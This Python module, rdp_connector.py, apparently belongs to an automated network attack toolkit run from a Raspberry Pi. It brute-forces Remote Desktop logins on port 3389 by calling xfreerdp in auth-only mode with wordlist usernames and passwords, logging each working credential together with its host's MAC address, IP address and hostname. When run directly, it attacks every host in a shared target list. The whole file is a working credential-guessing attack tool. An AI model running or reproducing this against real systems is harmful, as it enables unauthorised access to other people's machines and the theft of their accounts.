"""
rdp_connector.py — RDP brute force (port 3389).

Thin adapter over BaseConnector (#12). Only attempt() and the module-level
b_* discovery globals live here; queue/worker/run_bruteforce are shared.

Historical note: this connector is why the base exists. Its run_bruteforce used to reference
mac_address/hostname in the queue-fill loop before assigning them, so every real attack raised
UnboundLocalError and RDP never tried a single credential (#1). The ordering now lives in
base_connector.run_bruteforce, once, for all six protocols.
"""
import logging
import subprocess
from base_connector import BaseConnector, BaseBruteforce
from logger import Logger

logger = Logger(name="rdp_connector.py", level=logging.DEBUG)

b_class = "RDPBruteforce"
b_module = "rdp_connector"
b_status = "brute_force_rdp"
b_port = 3389
b_parent = None


class RDPConnector(BaseConnector):
    PORT = 3389
    HEADER = "MAC Address,IP Address,Hostname,User,Password,Port\n"
    OUTFILE_ATTR = "rdpfile"
    PROGRESS_LABEL = "RDP"
    QUEUE_HAS_MAC = True

    def attempt(self, adresse_ip, user, password):
        """Auth-only xfreerdp connect. Exit code 0 is a valid credential."""
        # argv list, never a shell string: `password` is wordlist / credential-pool data, and a
        # value containing `;` or `$(...)` would otherwise run as a command instead of being tried
        # as a password. Pinned by tests/test_command_injection.py.
        command = ["xfreerdp", f"/v:{adresse_ip}", f"/u:{user}", f"/p:{password}",
                   "/cert:ignore", "+auth-only"]
        try:
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # Hard timeout (#4) so a black-holed host cannot hang the worker forever.
            stdout, stderr = process.communicate(timeout=15)
            return process.returncode == 0
        except subprocess.TimeoutExpired:
            process.kill()
            process.communicate()  # drain
            logger.error(f"xfreerdp timed out for {adresse_ip}")
            return False
        except OSError as e:
            # OSError, not just SubprocessError: FileNotFoundError is raised when xfreerdp is not
            # installed — the common case on a stock Pi — and it is an OSError, so it escaped the
            # narrower clause and propagated out of the worker thread.
            logger.error(f"xfreerdp could not be run for {adresse_ip}: {e}")
            return False
        except subprocess.SubprocessError:
            return False


class RDPBruteforce(BaseBruteforce):
    connector_class = RDPConnector
    display_name = "RDPBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        rdp_bruteforce = RDPBruteforce(shared_data)
        logger.info("Starting RDP brute-force attack on port 3389...")
        for row in shared_data.read_data():
            ip = row["IPs"]
            logger.info(f"Executing RDPBruteforce on {ip}...")
            rdp_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total number of successes: {len(rdp_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
